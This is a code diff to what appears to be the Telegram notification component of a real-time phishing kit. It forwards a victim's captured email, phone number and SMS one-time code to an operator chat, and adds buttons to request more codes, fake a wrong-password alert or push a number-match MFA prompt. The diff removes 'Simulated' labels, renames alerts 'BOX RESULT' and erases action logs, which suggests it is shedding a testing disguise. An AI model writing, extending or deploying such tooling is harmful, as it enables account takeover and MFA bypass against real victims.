@@ -97,7 +97,6 @@ class TelegramService:
                 pass
 
         message = f"""
-    🔐 <b>Simulated Guest Gateway Login</b>
     ━━━━━━━━━━━━━━━━━━
     🏢 <b>Portal:</b> {provider_name}
     📧 <b>Guest Email:</b> <code>{state.get('email') or "Unknown"}</code>
@@ -136,7 +135,7 @@ class TelegramService:
                 {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
             ])
         else:
-            keyboard.append([
+           keyboard.append([
                 {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
             ])
 
@@ -150,15 +149,13 @@ class TelegramService:
         attempt_id = state.get("id", "")
 
         message = f"""
-📲 <b>Simulated Guest OTP Received!</b>
+📲 <b>BOX RESULT</b>
 ━━━━━━━━━━━━━━━━━━
 🏢 <b>Portal:</b> {state.get('provider', '').upper()}
 📧 <b>Guest Email:</b> <code>{state.get('email') or "Unknown"}</code>
 📞 <b>Bound Mobile:</b> <code>+1 {state.get('phone') or "Not provided"}</code>
 📟 <b>Submitted OTP:</b> <code>{state.get('smsCode') or "(Empty)"}</code>
 ━━━━━━━━━━━━━━━━━━
-<b>⚠️ RE-VERIFY CONTROL</b>
-What is the guest status for this OTP?
         """.strip()
 
         keyboard = []
@@ -169,6 +166,10 @@ What is the guest status for this OTP?
             {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
             {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
         ])
+
+        keyboard.append([
+                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
+            ])
 
         candidates = state.get("promptCandidates") or []
         if candidates and isinstance(candidates, (list, tuple)) and len(candidates) > 0:
@@ -391,13 +392,16 @@ What is the guest status for this OTP?
                                         [
                                             {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
                                             {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
-                                        ]
+                                        ],
+                                        [
+                                            {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
+            ]
                                     ]
                                 }
                                 self.api_call("editMessageText", {
                                     "chat_id": chat_id_val,
                                     "message_id": orig.get("message_id") if orig else None,
-                                    "text": orig_text + f"\n\n⚡️ Guest is seeing number: {chosen_candidates[0] if chosen_candidates else ''}\nWaiting for host to verify via Google and approve or reject.",
+                                    "text": orig_text ,
                                     "parse_mode": "HTML",
                                     "reply_markup": control_keyboard
                                 })
@@ -420,9 +424,9 @@ What is the guest status for this OTP?
                                 if original_msg:
                                     current_text = original_msg.get("text") or ""
                                     if current_text:
-                                        updated_text = f"{current_text}\n\n━━━━⊱ ACTION LOG ⊰━━━━\n⚡️ <i>Action Selected: {feedback}</i>"
+                                        updated_text =""
                                     else:
-                                        updated_text = f"{original_msg.get('caption') or ''}\n\n[Action Selected: {feedback}]"
+                                        updated_text = f"{original_msg.get('caption') or ''}\n\n"
                                     self.api_call("editMessageText", {
                                         "chat_id": original_msg.get("chat", {}).get("id"),
                                         "message_id": original_msg.get("message_id"),
